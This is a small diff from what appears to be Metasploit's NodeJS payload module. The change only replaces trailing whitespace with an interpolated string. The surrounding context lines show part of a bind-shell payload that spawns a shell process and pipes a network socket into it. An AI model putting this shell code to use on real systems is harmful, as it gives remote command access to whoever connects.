@@ -14,7 +14,7 @@ module Msf::Payload::NodeJS
             cp = require("child_process"),
             util = require("util");
 
-        var server = net.createServer(function(socket) {  
+        var server = net.createServer(function(socket) {#{'  '}
           var sh = cp.spawn(cmd, []);
           socket.pipe(sh.stdin);
           if (typeof util.pump === "undefined") {
